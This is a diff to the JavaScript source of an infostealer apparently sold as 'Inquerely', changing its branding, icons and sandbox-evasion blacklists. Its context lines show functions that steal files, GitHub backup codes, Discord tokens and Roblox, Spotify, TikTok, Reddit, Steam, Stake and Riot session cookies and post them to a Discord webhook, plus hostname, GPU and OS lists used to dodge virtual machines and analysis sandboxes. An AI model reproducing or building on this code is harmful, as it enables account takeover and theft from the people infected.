@@ -30,7 +30,7 @@ const chatId = 'YOURCHATID';
 const discordWebhookUrl = 'REMPLACE_ME';
 
 
-const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "DESKTOP-RQ1GF69", "fv-az269-80", "DESKTOP-PCIJV7I", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
+const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "DESKTOP-RQ1GF69", "DESKTOP-PCIJV7I", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
 const blackListedUsername = ["WDAGUtilityAccount",]
 const blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер", ]
 const blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"]
@@ -567,7 +567,7 @@ async function findGithubBackupCodes() {
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
                 text: `${user.hostname} | inquerely.com`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                icon_url: 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless',
               },
             };
 
@@ -645,7 +645,7 @@ function stealFiles() {
 
 
 function sendSuccessToWebhook() {
-    const successMessage = '**<--------------------------INJECTION STARTED--------------------------->**';
+    const successMessage = '```\n<INJECTION STARTED>\nPremium Version > https://inquerely.com\n```';
     axios.post(discordWebhookUrl, {
         content: successMessage,
     }).then(response => {
@@ -1432,7 +1432,7 @@ async function SubmitRoblox(secret_cookie) {
       ],
       footer: {
         text: `${user.hostname} | Inquerely.com`,
-        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+        icon_url: 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless',
       },
     };
 
@@ -1490,7 +1490,7 @@ async function SpotifySession(cookie) {
             ],
             footer: {
                 text: `${user.hostname} | Inquerely.com`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                icon_url: 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless'
             }
         };
 
@@ -1612,7 +1612,7 @@ function stealTikTokSession(cookie) {
                       ],
                       footer: {
                         text: `${user.hostname} | Inquerely.com`,
-                        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                        icon_url: 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless',
                       },
                     }
                   ]
@@ -1698,7 +1698,7 @@ function setRedditSession(cookie) {
                             ],
                             footer: {
                                 text: `${user.hostname} | Inquerely.com`,
-                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                                icon_url: 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless'
                             },
                             author: {
                                 name: "Reddit Session Detected",
@@ -1944,7 +1944,7 @@ async function getTokens() {
                 ],
                 footer: {
                     text: `${user.hostname} | Inquerely.com`,
-                    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                    icon_url: 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless'
                 }
             };
 
@@ -2603,7 +2603,7 @@ function createSteamEmbed(account, accountInfo, games, level) {
         ],
         footer: {
             text: `${user.hostname} | Inquerely.com`,
-            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            icon_url: 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless',
         },
     };
 }
@@ -3137,8 +3137,8 @@ try {
         description: '‎',
         color: 0x303037,
         author: {
-            name: `${user.hostname} | System Information | rvlt.gg/WF80RrNf`,
-            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            name: `${user.hostname} | System Information | Inquerely.com`,
+            icon_url: 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless',
         },
         fields: [
             {
@@ -3195,7 +3195,7 @@ try {
         ],
         footer: {
             text: `${user.hostname} | Inquerely.com`,
-            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            icon_url: 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless',
         },
     };
 
@@ -3778,7 +3778,7 @@ async function sendKeywordsToDiscord(keywords) {
             "color": 0x303037,
             "footer": {
                 "text": `${user.hostname} | Inquerely.com`,
-                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                "icon_url": 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless'
             }
         };
 
@@ -3805,7 +3805,7 @@ async function sendStakeSessionToDiscord(decrypted) {
             "color": 0x303037,
             "footer": {
                 "text": `${user.hostname} | Inquerely.com`,
-                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                "icon_url": 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless'
             },
             "thumbnail": {
                 "url": 'https://cdn.discordapp.com/attachments/1223099035162771528/1283211354144112712/vizimexvux7d1.gif?ex=66e22b33&is=66e0d9b3&hm=7021a54c292b6a767aaa18baebb8c707ea5fa224c366f676abd6e23bd8168df2&'
@@ -3982,7 +3982,7 @@ async function RiotGameSession(cookie) {
             "color": 0x303037,
             "footer": {
                 "text": `${user.hostname} | rvlt.gg/WF80RrNf`,
-                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                "icon_url": 'https://media.discordapp.net/attachments/1354134839431004254/1354146033101307934/MFf3Pcsirrviabf5nwH5jdS6BgAAAAAElFTkSuQmCC.png?ex=67e43a45&is=67e2e8c5&hm=f818632f05e2f7ebe143f4ca4f0deb9a1ef0a924bde4590e9e26d8eed579e029&=&format=webp&quality=lossless'
             },
             "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
             "author": {
